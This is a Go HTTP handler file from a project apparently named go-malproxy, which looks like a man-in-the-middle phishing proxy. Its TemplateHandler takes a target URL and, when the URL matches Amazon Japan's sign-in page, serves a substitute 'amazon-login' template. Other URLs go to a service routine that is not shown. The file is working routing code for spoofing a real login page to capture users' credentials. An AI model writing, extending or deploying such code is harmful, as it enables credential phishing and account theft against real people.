package handler

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"strings"

	"github.com/go-malproxy/server/service"
	"github.com/go-malproxy/server/templates"
)

var parent, children context.Context
var services service.Service = &service.Contents{Parent: &parent, Children: &children}

func IndexHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/
	templates.Executor.ExecuteTemplate(w, "index", nil)
}

func HelloHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/hello
	templates.Executor.ExecuteTemplate(w, "hello", nil)
}

func TemplateHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/template?url=http://mitm.es3/amazon.co.jp
	fmt.Println("\x1b[31mURL:\x1b[0m", r.FormValue("url")) //取得したパラメータの表示
	url := r.FormValue("url")
	if strings.Contains(url, "https://www.amazon.co.jp/ap/signin?openid.pape.max_auth_age") {
		fmt.Println("Amazon Login")
		templates.Executor.ExecuteTemplate(w, "amazon-login", nil)
	} else {
		fmt.Println("Main Operation")
		res, err := service.MainOperation(url)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println("res:", res)
		templates.Executor.ExecuteTemplate(w, res, nil)
	}
}
